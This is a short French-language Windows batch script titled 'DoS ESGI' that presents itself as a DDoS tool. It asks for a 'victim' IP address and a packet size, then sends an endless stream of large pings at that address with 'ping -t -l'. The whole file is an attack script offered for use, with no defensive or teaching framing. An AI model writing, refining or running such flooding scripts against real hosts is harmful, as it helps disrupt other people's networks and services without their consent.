@echo off 
color a 
title DoS ESGI
cls
goto start
:start
echo DDoS Batch
pause
echo Rassemblement des fichiers
ping localhost >nul
echo Début du programme
echo.
echo Entre l'IP de ta victime
set /p x=Adresse IP:
echo Scanning IP
ping %x%
goto size
:size
echo Entrer le nombre de paquets
set /p p=Nombre de Paquets:
echo Press any key to continue
pause >nul
goto ddos
:ddos
color c
ping %x% -t -l %p%